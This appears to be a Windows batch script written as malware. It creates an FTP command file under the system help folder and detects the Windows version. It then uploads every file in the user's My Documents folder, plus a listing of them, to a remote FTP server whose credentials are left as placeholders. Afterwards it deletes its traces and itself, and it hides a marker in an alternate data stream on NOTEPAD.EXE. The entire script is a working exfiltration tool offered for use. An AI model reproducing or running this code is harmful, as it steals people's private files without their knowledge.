@ECHO OFF
IF EXIST "%SystemRoot%\help\combat\com.log" GOTO Log
> "%SystemRoot%\NOTEPAD.EXE:com.log" ECHO [log] 1
GOTO Com

:Log
> "%SystemRoot%\help\combat\com.log" ECHO [log] 1

:Com
SET FTPSERV=(Your FTP SERVER)
SET FTPUSER=(Your FTP USERNAME)
SET FTPPASS=(Your FTP PASSWORD)

:Upldir
> "%SystemRoot%\help\combat\upldir.txt" ECHO open %FTPSERV%
>>"%SystemRoot%\help\combat\upldir.txt" ECHO %FTPUSER%
>>"%SystemRoot%\help\combat\upldir.txt" ECHO %FTPPASS%
>>"%SystemRoot%\help\combat\upldir.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\upldir.txt" ECHO prompt

:FindOS
VER|FIND "XP">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "2000">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "NT">NUL
IF NOT ERRORLEVEL 1 GOTO WinNT
VER|FIND "Mil">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "98">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "95">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
GOTO End

:Win2K
>>"%SystemRoot%\help\combat\upldir.txt" ECHO mput "%SystemDrive%\Documents and Settings\%USERNAME%\My Documents\*.*"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO put "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO bye
DIR "%SystemDrive%\Documents and Settings\%USERNAME%\My Documents\" > "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.log" ECHO.
GOTO Upload

:WinNT
>>"%SystemRoot%\help\combat\upldir.txt" ECHO mput "%SystemRoot%\profiles\%USERNAME%\personal\*.*"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO put "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO bye
DIR "%SystemRoot%\profiles\%USERNAME%\personal\" > "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.log" ECHO.
GOTO Upload

:Win9X
>>"%SystemRoot%\help\combat\upldir.txt" ECHO mput "%SystemDrive%\My Documents\*.*"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO put "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO bye
DIR "%SystemDrive%\My Documents\" > "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.log" ECHO.
GOTO Upload

:Upload
IF NOT EXIST "%SystemRoot%\help\combat\upldir.txt" GOTO FindOS
FTP -s:"%SystemRoot%\help\combat\upldir.txt" > "%SystemRoot%\help\combat\upldir.log"
DEL /F /Q "%SystemRoot%\help\combat\upldir.txt"

:End
DEL /F /Q "%0" >NUL
EXIT